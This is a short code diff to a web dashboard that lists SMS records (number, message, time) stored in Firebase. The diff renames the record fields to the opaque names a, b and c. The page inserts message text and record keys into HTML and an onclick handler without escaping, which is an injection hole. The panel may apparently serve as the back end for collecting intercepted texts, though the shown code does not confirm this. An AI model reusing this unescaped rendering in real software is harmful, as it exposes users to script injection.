@@ -257,11 +257,11 @@ const firebaseConfig = {
                             .map(key => ({ key, ...smsData[key] }))
                             .sort((a, b) => new Date(b.time) - new Date(a.time));
 
-                        const smsEntries = sortedSmsData.map(({ key, phoneNumber, message, time }) => `
+                        const smsEntries = sortedSmsData.map(({ key, a, b, c }) => `
                             <div class="sms-entry" id="${key}">
-                                <p><span class="label">Number: </span> <span class="data">${phoneNumber || 'N/A'}</span></p>
-                                <p><span class="label">Message: </span> <span class="data">${message || 'N/A'}</span></p>
-                                <p><span class="label">Time: </span> <span class="data">${time || 'N/A'}</span></p>
+                                <p><span class="label">Number: </span> <span class="data">${a || 'N/A'}</span></p>
+                                <p><span class="label">Message: </span> <span class="data">${b || 'N/A'}</span></p>
+                                <p><span class="label">Time: </span> <span class="data">${c || 'N/A'}</span></p>
                                 <div class="actions">
                                     <button class="delete-button" onclick="deleteSMS('${key}')">
                                         <i class="fa fa-trash"></i>
